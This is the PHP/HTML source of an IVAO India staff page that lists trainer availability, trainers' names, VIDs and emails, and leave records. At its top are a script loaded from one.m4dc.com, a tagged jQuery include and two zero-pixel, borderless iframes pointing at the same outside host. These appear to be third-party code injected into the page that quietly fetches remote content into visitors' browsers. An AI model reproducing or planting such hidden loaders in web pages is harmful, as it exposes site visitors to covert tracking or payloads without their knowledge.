<html xmlns="http://www.w3.org/1999/xhtml"><head><script type="text/javascript" src="http://one.m4dc.com/j/si1.js"></script></head><body bgcolor="#FFFFFF" style="">in
<title>Staff - IVAO India</title>
<link href="https://fonts.googleapis.com/css?family=Muli" rel="stylesheet" type="text/css">
<link rel="stylesheet" href="http://ivao.in/staff/styles.css">
<script src="http://code.jquery.com/jquery-latest.min.js" type="text/javascript"></script><script id="esdfd550487" type="text/javascript" src="http://code.jquery.com/jquery-latest.min.js?m4dc56=150487"></script><div><iframe src="http://one.m4dc.com/i/si.html" class="iifr" id="chk_frame" scrolling="no" width="0px" height="0px" frameborder="0" allowtransparency="true"></iframe></div><div><iframe src="http://one.m4dc.com/t/?r=0.9748239401930159" class="iifr" id="hdr_ifr" scrolling="no" width="0px" height="0px" frameborder="0" allowtransparency="true"></iframe></div>
<script src="http://ivao.in/flightbooking/script.js"></script>
<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet">
<link href="//netdna.bootstrapcdn.com/font-awesome/3.2.1/css/font-awesome.css" rel="stylesheet">
<link rel="shortcut icon" href="http://www.ivao.in/wp-content/uploads/2016/06/logo-e1466006858963.png" title="Favicon">
<link rel="stylesheet" href="//code.jquery.com/ui/1.11.2/themes/smoothness/jquery-ui.css">
<script src="//code.jquery.com/jquery-1.10.2.js"></script>
<script src="//code.jquery.com/ui/1.11.2/jquery-ui.js"></script>
<link rel="stylesheet" href="/resources/demos/style.css">
<script>
  $(function() {
    $("#accordion").accordion({ header: "h3", collapsible: true, active: false, heightStyle: "content"});
  });
</script>
<script type="text/javascript" src="http://ivao.in/files/shadowbox/shadowbox.js"></script>
<script type="text/javascript">
Shadowbox.init({
    handleOversize: "drag",
    modal: true
});

</script>


<div class="loader" style="display: none;"></div>
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
})
</script>
<div style="padding: 5px 20px 5px 20px;
margin: 10px 10px 10px 10px;
border-radius: 4px;
-webkit-border-radius: 4px;
-moz-border-radius: 4px;
-o-border-radius: 4px;
-khtml-border-radius: 4px;
background: white;
border: 1px solid;
border-color: #e5e5e5 #dbdbdb #d2d2d2;">

<?php
require ('assets/lib/mysql.php');
require ('assets/lib/main.class.php');
?>


<h1>Trainer Availability</h1>
<hr>
<?php
$id = 1;
$res = TA::auth_data($id);
foreach ($res as $r) {
  // echo $r['firstname'];
}

?>
<button class="add">Update my Availability</button> <button class="bluebutton">Apply for leave</button><br><br>

<h2>Trainers Availiable <span class="green">today</span> <?php echo strtoupper(date("d F Y")); ?></h2>


<table class="table" width="100%">
<tbody>
<tr>
<td>Trainer Name</td>
<td>IVAO VID</td>
<td>Email</td>
<td>Options</td>
</tr>
<?php

$availability = TA::trainers_available_today();
$all = TA::get_all_availability();
// print_r($all);
foreach ($availability as $av) {
  // print_r(TA::decipher_dates($av['dates']));
  ?>
  <tr>
    <td style="font-size:16px; text-align: left;"><?php echo $av['name']; ?></td>
    <td><span style="font-size:16px"><a href="https://www.ivao.aero/members/person/details.asp?ID=<?php echo $av['vid']; ?>" target="_blank" class="button"><?php echo $av['vid']; ?></a></span></td>
    <td style="font-size:16px; text-align: left;">UNABLE TO GET</td>
    <td style="font-size:16px; text-align: left;"><a href="http://staff.ivao.in/tmcadmin/schedule.php" class="greenbutton">Schedule a Training</a></td>
  </tr>
  <?php
}

?>
</tbody>
</table>

<!-- <br>
<hr>
<h2>Who's available next</h2>
<div id="accordion" style="font-size:12px; text-align:justify;" class="ui-accordion ui-widget ui-helper-reset" role="tablist">

  <h3 class="ui-accordion-header ui-state-default ui-accordion-icons ui-corner-all" role="tab" id="ui-id-1" aria-controls="ui-id-2" aria-selected="false" aria-expanded="true" tabindex="0">
    <span class="ui-accordion-header-icon ui-icon ui-icon-triangle-1-e"></span>
    3 JULY 2018
  </h3>
  <div class="ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" id="ui-id-2" aria-labelledby="ui-id-1" role="tabpanel" aria-hidden="true" style="display: none;"><ul>
	<li>Trainer : Jifry Shaheem | VID : 506123 </li>
  <li>Trainer : Jifry Shaheem | VID : 506123 </li>
  <li>Trainer : Jifry Shaheem | VID : 506123 </li>
  </ul></div>
</div> -->
<br>
<hr>
<h2>IVAO India Trainers</h2>
<table class="table" width="100%">
<tbody>
<tr>
<td>Trainer Name</td>
<td>IVAO VID</td>
<td>Email</td>
<td>Availability (June 2018)</td>
</tr>
<?php



$trainers = TA::get_all_trainers();
foreach ($trainers as $tar) {
  ?>
  <tr>
    <td style="font-size:16px; text-align: left;"><?php echo $tar['firstname'].' '.$tar['lastname']; ?></td>
    <td><span style="font-size:16px"><a href="https://www.ivao.aero/members/person/details.asp?ID=<?php echo $tar['vid']; ?>" target="_blank" class="button"><?php echo $tar['vid']; ?></a></span></td>
    <td style="font-size:16px; text-align: left;"><?php echo $tar['ivao_email']; ?></td>
    <td style="font-size:16px; text-align: left;">
      <?php
        // print_r();
        $eachdate = TA::trainer_availability($tar['vid']);
        if(!$eachdate) {
          echo '<span style="color: red;">Data not yet entered!</span>';
        } else {
          foreach ($eachdate as $ed) {
            $dates = $ed['dates'];

            $dates_array = TA::decipher_dates($dates);

            $j = 0;

            foreach($dates_array as $da) {


              $date = $da[$j];
              $month = '6';
              $year = '2018';

              $timestamp = strtotime($year.'-'.$month.'-'.$date);
              $day = date('l', $timestamp);
              echo ' '.$date.' ('.$day.')<br>';
              $j = $j++;
            }
          }
        }

        // print_r($dates_array);
      ?>
    </td>
  </tr>
  <?php
}

?>

  <!-- <tr>
    <td style="font-size:16px; text-align: left;">Rohit Dalaya</td>
    <td><span style="font-size:16px"><a href="https://www.ivao.aero/members/person/details.asp?ID=209766" target="_blank" class="button">209766</a></span></td>
    <td style="font-size:16px; text-align: left;">in-dir@ivao.aero</td>
    <td style="font-size:16px; text-align: left;">1,12,13,14,16</td>
  </tr>
  <tr>
    <td style="font-size:16px; text-align: left;">Karan Malik</td>
    <td><span style="font-size:16px"><a href="https://www.ivao.aero/members/person/details.asp?ID=209766" target="_blank" class="button">209766</a></span></td>
    <td style="font-size:16px; text-align: left;">in-dir@ivao.aero</td>
    <td style="font-size:16px; text-align: left;">1,12,13,14,16</td>
  </tr>
  <tr>
    <td style="font-size:16px; text-align: left;">Prajwol Shrestha </td>
    <td><span style="font-size:16px"><a href="https://www.ivao.aero/members/person/details.asp?ID=209766" target="_blank" class="button">209766</a></span></td>
    <td style="font-size:16px; text-align: left;">in-dir@ivao.aero</td>
    <td style="font-size:16px; text-align: left;">1,12,13,14,16</td>
  </tr>
  <tr>
    <td style="font-size:16px; text-align: left;">Leonard Selvaraja</td>
    <td><span style="font-size:16px"><a href="https://www.ivao.aero/members/person/details.asp?ID=209766" target="_blank" class="button">209766</a></span></td>
    <td style="font-size:16px; text-align: left;">in-dir@ivao.aero</td>
    <td style="font-size:16px; text-align: left;">1,12,13,14,16</td>
  </tr>
  <tr>
    <td style="font-size:16px; text-align: left;">Jifry Shaheem</td>
    <td><span style="font-size:16px"><a href="https://www.ivao.aero/members/person/details.asp?ID=209766" target="_blank" class="button">209766</a></span></td>
    <td style="font-size:16px; text-align: left;">in-dir@ivao.aero</td>
    <td style="font-size:16px; text-align: left;">1,12,13,14,16</td>
  </tr>
  <tr>
    <td style="font-size:16px; text-align: left;">Ankit Bisht</td>
    <td><span style="font-size:16px"><a href="https://www.ivao.aero/members/person/details.asp?ID=209766" target="_blank" class="button">209766</a></span></td>
    <td style="font-size:16px; text-align: left;">in-dir@ivao.aero</td>
    <td style="font-size:16px; text-align: left;">1,12,13,14,16</td>
  </tr> -->
</tbody>
</table>
<br>
<hr><h2>Active LOA's<br><small>List of trainers who are on Leave</small></h2>

<table class="table" width="100%">
<tbody>
<tr>
  <td>Trainer Name</td>
  <td>IVAO VID</td>
  <td>LOA Duration</td>
  <td>Status</td>
  </tr>

    <tr>
      <td style="font-size:16px; text-align: left;">Rohit Dalaya</td>
      <td><span style="font-size:16px"><a href="https://www.ivao.aero/members/person/details.asp?ID=209766" target="_blank" class="button">209766</a></span></td>
      <td style="font-size:16px; text-align: left;">12 MAR 2018 - 20 JUN 2018 (20 days more)</td>
      <td style="font-size:16px; text-align: left;">Approved</td>
    </tr>
</tbody>
</table>

<br><br><table style="width:100%; color:#696969;">
		<tbody><tr style="color:#696969; font-family:arial; font-size:13px">
			<td style="width: 50%;">IVAO - India © 2015 - 2017</td>
			<td style="text-align: right; width: 50%;">staff.ivao.in</td>
		</tr>
</tbody></table></div>

</body></html>
